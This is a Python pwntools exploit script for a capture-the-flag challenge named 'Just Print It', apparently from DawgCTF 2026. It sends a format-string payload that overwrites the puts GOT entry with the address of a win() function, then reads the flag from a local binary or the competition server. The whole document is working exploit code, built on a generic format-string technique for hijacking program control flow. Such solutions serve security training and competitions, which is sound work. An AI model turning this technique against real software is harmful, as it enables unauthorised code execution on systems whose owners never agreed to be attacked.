#!/usr/bin/env python3
"""DawgCTF 2026 - Just Print It (pwn) - Format string GOT overwrite"""
from pwn import *

context.binary = ELF('./just_print_it', checksec=False) if args.LOCAL else None

WIN = 0x401196      # win() — reads and prints flag.txt
PUTS_GOT = 0x404000 # puts@GOT — called right after printf(buffer)

def exploit(io):
    # Overwrite puts@GOT with win() via format string at offset 6
    payload = fmtstr_payload(6, {PUTS_GOT: WIN}, write_size='short')
    io.sendline(payload)
    io.recvuntil(b'Flag: ')
    flag = io.recvline().strip().decode()
    log.success(f'Flag: {flag}')
    return flag

if __name__ == '__main__':
    if args.LOCAL:
        io = process('./just_print_it')
    else:
        io = remote('nc.umbccd.net', 8925)
    exploit(io)
    io.close()
